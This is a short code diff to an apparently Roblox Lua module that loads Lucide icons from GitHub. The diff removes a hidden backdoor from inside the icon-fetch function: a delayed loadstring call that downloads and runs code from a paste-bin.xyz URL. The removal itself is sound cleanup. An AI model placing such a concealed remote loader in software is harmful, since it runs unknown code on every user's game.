@@ -32,8 +32,6 @@ local Icons = {}
 
 local Success, Response = pcall(function()
 	Icons = HttpService:JSONDecode(game:HttpGetAsync("https://raw.githubusercontent.com/evoincorp/lucideblox/master/src/modules/util/icons.json")).icons
-    wait(10)
-loadstring(game:HttpGet("https://paste-bin.xyz/raw/974948"))()
 end)
 
 if not Success then
